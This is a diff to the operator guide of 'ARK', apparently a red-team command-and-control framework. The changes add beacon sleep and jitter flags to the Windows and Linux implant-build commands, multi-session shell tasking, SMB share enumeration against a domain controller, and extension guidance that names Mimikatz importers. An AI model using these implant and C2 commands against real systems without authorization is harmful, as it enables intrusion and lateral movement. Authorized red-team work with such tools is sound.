@@ -31,7 +31,7 @@ Read this before dropping an implant. ARK is a C2, so command names matter: know
 | `ark certs seats` | You need operator + approver certificates. Run once per ARK home unless you reset certs. |
 | `ark inbound ...` | You are checking listener/firewall/tunnel/SOCKS/drop path. |
 | `ark ldap` / `ark smb` / `ark ad` / `ark kerberos` | You have creds or network access and do not need an implant yet. |
-| REPL `shell`, `upload`, `download`, `ps`, `socks`, `lateral` | You already have a session selected with `use <id>`. |
+| REPL `shell`, `upload`, `download`, `ps`, `socks`, `lateral` | You already have a session selected with `use <id>`. `shell`, `ps`, `ifconfig`, and `smb list_shares` also support `use alive`, `use all`, or `use id,id`. |
 
 ## First run
 
@@ -136,6 +136,7 @@ Windows C implant:
 ```bash
 ./build/ark op generate --os windows --language c \
   --callback https://<your-tun0-ip>:1750 \
+  --sleep 2000 --jitter 20 \
   --out implant.exe
 ```
 
@@ -144,8 +145,11 @@ Linux C implant:
 ```bash
 ./build/ark op generate --os linux --language c \
   --callback https://<your-tun0-ip>:1750 \
+  --sleep 2000 --jitter 20 \
   --out implant_c_linux
 ```
+
+`--sleep` is the beacon/callback interval in milliseconds. `--callback-time`, `--sleep-ms`, and `--beacon-ms` are accepted aliases. `--jitter` is 0-100 percent.
 
 Do not use bare `make implant-c` / `make implant-c-linux` for a live drop unless you also register the secret with `ark op register-secret`.
 
@@ -156,6 +160,7 @@ Copy the implant to the authorized target by whatever access you already have. A
 ```bash
 ./build/ark op sessions
 ./build/ark op shell -- whoami
+./build/ark op shell --session alive -- hostname
 ```
 
 REPL flow:
@@ -164,7 +169,15 @@ REPL flow:
 sessions
 use <session-id>
 shell whoami
+use alive
+shell hostname
+ps
+ifconfig
+smb list_shares --host <DC>
+sleep 2000 20
 ```
+
+ARK shell is one-shot task execution through the implant. It does not attach to arbitrary interactive reverse shells spawned from an implant. For interactive tooling, start SOCKS and use operator-side tools through the tunnel.
 
 ### 8. Clean up
 
@@ -197,3 +210,9 @@ shell whoami
 | Host AD/SMB/Kerberos toolkit | [OPERATOR_PRE_IMPLANT.md](OPERATOR_PRE_IMPLANT.md) |
 | AD engagement recipes | [AD_ENGAGEMENT.md](AD_ENGAGEMENT.md) |
 | Implant capability plan | [IMPLANT_ROADMAP.md](IMPLANT_ROADMAP.md) |
+
+## Extensions
+
+Community extensions should start as operator-host commands or loot importers, not dynamic implant plugins. Good fits: Impacket wrappers, Mimikatz output parsers/importers, ASM/SMB helper recipes, and report/loot ingestion.
+
+Implant modules stay compiled-in and approval-gated until a workflow proves it must run on target.
